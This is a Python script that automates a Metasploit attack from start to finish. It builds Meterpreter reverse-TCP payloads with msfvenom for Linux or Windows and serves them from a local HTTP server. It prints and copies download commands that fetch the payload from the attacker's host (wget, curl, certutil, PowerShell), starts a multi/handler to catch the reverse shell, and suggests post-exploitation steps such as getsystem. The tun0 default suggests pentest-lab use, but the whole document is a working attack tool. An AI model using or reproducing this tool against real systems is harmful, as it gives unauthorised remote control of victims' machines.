import subprocess
import re
import threading
import http.server
import socketserver
import socket
import sys
import os
import tempfile
import select
import time

# ---------- Helpers ----------
def is_valid_port(p):
    try:
        n = int(p)
        return 1 <= n <= 65535
    except (ValueError, TypeError):
        return False

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except OSError:
        return False

def port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("0.0.0.0", port))
            return False
        except OSError:
            return True

def find_free_port(start):
    p = start
    while p <= 65535:
        if not port_in_use(p):
            return p
        p += 1
    return None

# ---------- LHOST ----------
lhost = input("lhost: ").strip()
if lhost == "":
    try:
        result = subprocess.run(
            ["ip", "a", "show", "tun0"],
            capture_output=True, text=True, timeout=5
        )
        match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", result.stdout or "")
        if match:
            lhost = match.group(1)
        else:
            print("[!] Could not find inet address on tun0")
            sys.exit(1)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print(f"[!] Error getting tun0 IP: {e}")
        sys.exit(1)

if not is_valid_ip(lhost):
    print(f"[!] Invalid LHOST: {lhost}")
    sys.exit(1)
print(f"[*] Using LHOST: {lhost}")

# ---------- LPORT ----------
lport = input("lport: ").strip()
if lport == "":
    lport = "9443"
if not is_valid_port(lport):
    print(f"[!] Invalid port: {lport}. Falling back to 9443.")
    lport = "9443"
lport = int(lport)

if port_in_use(lport):
    new_port = find_free_port(lport + 1)
    if new_port is None:
        print(f"[!] Port {lport} in use and no free port found.")
        sys.exit(1)
    print(f"[!] Port {lport} already in use. Switching to {new_port}.")
    lport = new_port

print(f"[*] Using LPORT: {lport}")

# ---------- OS env ----------
osenv = input("os_env [def lin] [1 win]: ").strip()
if osenv == "":
    os_env = 0
else:
    try:
        os_env = int(osenv)
        if os_env not in (0, 1):
            raise ValueError
    except ValueError:
        print("[!] Invalid os_env, defaulting to Linux (0).")
        os_env = 0

# ---------- Outfile ----------
outfile = input("outfile: ").strip()
if outfile == "":
    outfile = "meter.elf" if os_env == 0 else "meter.exe"
outfile = os.path.basename(outfile)
if not outfile:
    print("[!] Invalid outfile name.")
    sys.exit(1)
print(f"[*] Using outfile: {outfile}")

# ---------- Payload ----------
PAYLOAD = None
if os_env == 0:
    PAYLOAD = "linux/x64/meterpreter_reverse_tcp"
    cmd = [
        "msfvenom",
        "-p", PAYLOAD,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "elf",
        "-o", outfile,
    ]
    print(f"[*] Running: {' '.join(cmd)}")
    try:
        ret = subprocess.run(cmd, check=False)
        if ret.returncode != 0:
            print(f"[!] msfvenom exited with code {ret.returncode}")
            sys.exit(1)
    except FileNotFoundError:
        print("[!] msfvenom not found in PATH.")
        sys.exit(1)
elif os_env == 1:
    PAYLOAD = "windows/x64/meterpreter/reverse_tcp"
    cmd = [
        "msfvenom",
        "-p", PAYLOAD,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "exe",
        "-o", outfile,
    ]
    print(f"[*] Running: {' '.join(cmd)}")
    try:
        ret = subprocess.run(cmd, check=False)
        if ret.returncode != 0:
            print(f"[!] msfvenom exited with code {ret.returncode}")
            sys.exit(1)
    except FileNotFoundError:
        print("[!] msfvenom not found in PATH.")
        sys.exit(1)

if not os.path.isfile(outfile):
    print(f"[!] Payload file '{outfile}' was not created. Aborting.")
    sys.exit(1)

# ---------- Server type ----------
server_type = input("server_type [def python] [1 php]: ").strip()
if server_type != "":
    print("the method is not LOL(living off land). please wait for script update")
    sys.exit(0)

# ---------- Download commands ----------
print("on target try:")
if os_env == 0:
    download_cmd = f"wget http://{lhost}:{lport}/{outfile}"
    curl_cmd     = f"curl http://{lhost}:{lport}/{outfile} -o {outfile}"
    py_cmd       = f"python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{lhost}:{lport}/{outfile}','{outfile}')\""
else:
    download_cmd = f"certutil -urlcache -split -f http://{lhost}:{lport}/{outfile} {outfile}"
    curl_cmd     = f"curl.exe -o {outfile} http://{lhost}:{lport}/{outfile}"
    py_cmd       = f"powershell -c \"iwr http://{lhost}:{lport}/{outfile} -OutFile {outfile}\""

print(f"1. {download_cmd}")
print(f"2. {curl_cmd}")
print(f"3. {py_cmd}")

# ---------- HTTP server ----------
get_hit        = threading.Event()
shutdown_event = threading.Event()
server_ready   = threading.Event()
server_error   = {"msg": None}
httpd_ref      = {"obj": None}    # <-- shared handle for stop_server()

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        get_hit.set()
        super().do_GET()
    def log_message(self, fmt, *args):
        pass

def start_server():
    try:
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer(("0.0.0.0", lport), Handler)
        httpd.timeout = 0.25
        httpd_ref["obj"] = httpd
        server_ready.set()
        while not shutdown_event.is_set():
            httpd.handle_request()
    except OSError as e:
        server_error["msg"] = str(e)
        server_ready.set()
    finally:
        if httpd_ref["obj"] is not None:
            try:
                httpd_ref["obj"].server_close()
            except Exception:
                pass

server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

server_ready.wait(timeout=3)
if server_error["msg"]:
    print(f"[!] Failed to start HTTP server: {server_error['msg']}")
    sys.exit(1)
if not server_thread.is_alive():
    print("[!] HTTP server thread died unexpectedly.")
    sys.exit(1)

print(f"[*] Python HTTP server started on 0.0.0.0:{lport}")

def stop_server():
    # 1. Signal the loop to exit
    shutdown_event.set()
    # 2. Explicitly close the listening socket — this is what frees the port
    if httpd_ref["obj"] is not None:
        try:
            httpd_ref["obj"].server_close()
        except Exception:
            pass
    # 3. Join the thread (it will exit promptly now)
    server_thread.join(timeout=3)
    # 4. Confirm port is free
    for _ in range(30):
        if not port_in_use(lport):
            return True
        time.sleep(0.1)
    return False

# ---------- Clipboard ----------
def copy_to_clipboard(text):
    for cmd in (["xclip", "-selection", "clipboard"],
                ["xsel", "--clipboard", "--input"]):
        try:
            subprocess.run(cmd, input=text, text=True, check=True)
            print(f"[*] Copied to clipboard: {text}")
            return
        except (FileNotFoundError, subprocess.CalledProcessError):
            continue
    print(f"[!] Could not copy to clipboard. Command: {text}")

# ---------- Choice loop ----------
chosen_cmd = None
while chosen_cmd is None:
    try:
        copy_choice = input("choice: ").strip()
    except EOFError:
        stop_server()
        sys.exit(0)

    if copy_choice == "":
        chosen_cmd = download_cmd
    elif copy_choice == "2":
        chosen_cmd = curl_cmd
    elif copy_choice == "3":
        chosen_cmd = py_cmd
    else:
        print("[!] Invalid choice. Press enter for default.")

copy_to_clipboard(chosen_cmd)
print("chosen, now hit the target...")

# ---------- Wait: GET OR Enter (whichever first). NO second Enter. ----------
print("[*] Waiting for GET request from target... (or press Enter to start msfconsole now)")
try:
    while True:
        if get_hit.wait(timeout=0.25):
            print("[*] GET request detected. Proceeding to msfconsole.")
            break
        if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            sys.stdin.readline()
            print("[*] Enter pressed. Proceeding to msfconsole.")
            break
except KeyboardInterrupt:
    stop_server()
    print("\n[*] Interrupted. Exiting.")
    sys.exit(0)

# ---------- Tear down HTTP server BEFORE msfconsole binds ----------
print(f"[*] Stopping HTTP server on port {lport}...")
if stop_server():
    print(f"[*] Port {lport} released.")
else:
    print(f"[!] Port {lport} still appears in use; msfconsole may fail to bind.")

# ---------- msfconsole handler ----------
def launch_msfconsole():
    rc_lines = [
        "use exploit/multi/handler",
        f"set payload {PAYLOAD}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",
        "run -j",
        "",
    ]
    fd, rc_path = tempfile.mkstemp(prefix="msf_rc_", suffix=".rc")
    try:
        with os.fdopen(fd, "w") as f:
            f.write("\n".join(rc_lines))
        print(f"[*] Launching msfconsole with handler on port {lport} (rc: {rc_path})")
        print("[*] Once a session is caught: sessions -> sessions -i <id> -> shell")
        subprocess.run(["msfconsole", "-q", "-r", rc_path], check=False)
    except FileNotFoundError:
        print("[!] msfconsole not found in PATH.")
    finally:
        try:
            os.unlink(rc_path)
        except OSError:
            pass

print()
print("=" * 60)
print("[*] Starting msfconsole handler in this shell.")
print("[*] After a session is caught inside msfconsole, run:")
print("      sessions")
print("      sessions -i <id>")
if os_env == 0:
    print("      shell")
    print("      python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
else:
    print("      shell")
    print("      (Windows: use `upload` / `download` / `getsystem` from meterpreter prompt)")
print("=" * 60)

try:
    launch_msfconsole()
except KeyboardInterrupt:
    print("\n[*] Interrupted.")
finally:
    print("[*] Exiting.")
    sys.exit(0)
